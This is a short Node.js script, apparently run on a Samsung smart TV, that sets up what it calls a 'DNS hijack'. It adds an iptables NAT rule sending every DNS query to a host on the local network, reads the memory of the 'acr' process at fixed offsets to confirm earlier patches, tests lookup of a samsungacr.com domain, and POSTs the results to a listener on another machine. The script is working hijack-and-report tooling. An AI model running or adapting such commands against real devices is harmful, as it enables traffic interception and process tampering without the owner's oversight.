"use strict";
// audit105.js - re-establish DNS hijack + verify acr running + verify patched callbacks.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

// 1. DNS hijack: DNAT udp:53 -> PC:5353
out.iptables_before = sh("iptables -t nat -L OUTPUT -n 2>&1 | head -20", 2000);
out.dns_redirect = sh("iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination 192.168.1.64:5353 2>&1; echo RC=$?", 300);
out.iptables_after = sh("iptables -t nat -L OUTPUT -n 2>&1 | head -20", 2000);

// 2. verify acr is running + patched
out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (pid) {
    out.verify1 = sh("dd if=/proc/" + pid + "/mem bs=1 skip=$((0x96c08)) count=4 2>/dev/null | od -An -tx1", 150);
    out.verify2 = sh("dd if=/proc/" + pid + "/mem bs=1 skip=$((0x97c84)) count=4 2>/dev/null | od -An -tx1", 150);
    out.maps_vd = sh("cat /proc/" + pid + "/maps | grep VDCurl | head -3", 300);
}

// 3. test DNS resolution from TV
out.dns_test = sh("nslookup log-ingestion-v2-ap2.samsungacr.com 192.168.1.64 2>&1 | head -10", 1500);

post("/p105_setup", out);
post("/p105_done", { started: out.started });
